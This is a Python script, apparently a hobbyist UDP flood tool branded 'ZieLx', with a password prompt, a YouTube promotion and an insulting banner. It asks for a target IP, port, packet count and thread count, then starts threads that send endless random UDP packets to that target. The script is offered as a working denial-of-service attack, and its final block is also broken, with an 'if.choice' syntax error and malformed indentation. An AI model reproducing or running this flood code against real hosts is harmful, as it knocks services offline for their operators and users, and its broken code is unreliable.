import random
import socket
import threading
import os,sys
import time

password = input("[+] Password :")
time.sleep(2)
print("[•]  WAIT FOR 5 SECOND!!! ") 
time.sleep(5) 
if password=="zielx":
  print("[✓] Login Successful!!!")
  time.sleep(3)
  os.system("clear")
  print("\033[1;34;40m=>Build By ZieLx<=")
  time.sleep(1)
  print("\033[1;34;40m=>YT ZIEL ?<= ")
  time.sleep(1)
  print("\033[1;34;40m=>DONT FORGET TO SUBS MY YOUTUBE CHANNEL<=")
  time.sleep(3)
os.system('clear')
print("""
\033[1;31;40m

███████╗██╗███████╗██╗░░░░░██╗░░██╗
╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝
░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░
██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░
███████╗██║███████╗███████╗██╔╝╚██╗
╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
         >>>  HAI KONTOL!!! 
         >>>  Build By ZieLx
         >>>  Don't forget to subs my YouTube Channel
         >>>  MY YOUTUBE : ZIEL ?\033[1;31;40m
""")

ip = str(input("===> IP TARGET : "))
port = int(input("===> PORT TARGET : "))
times = int(input("===> PACKETS : "))
threads = int(input("===> THREADS : "))
choice = str(input("===> Ready To Send? (y/n)     : ")) 

def wibu():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" \033[92m[•] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")

def wibu2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" \033[92m[•] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")
		except:
			print(f" \033[92m[×] ZieLx Attack Ip \033[1;31;40m{ip} \033[92mPort \033[1;31;40m{port} \033[92m!!!")


# Threads
for y in range(threads):
	if.choice == 'y':
	th = threading.Thread(target = wibu)
	th.start()
else:
		th = threading.Thread(target = wibu2)
		th.start()
		print("\033[1;31;40m[!] Wrong Password!")
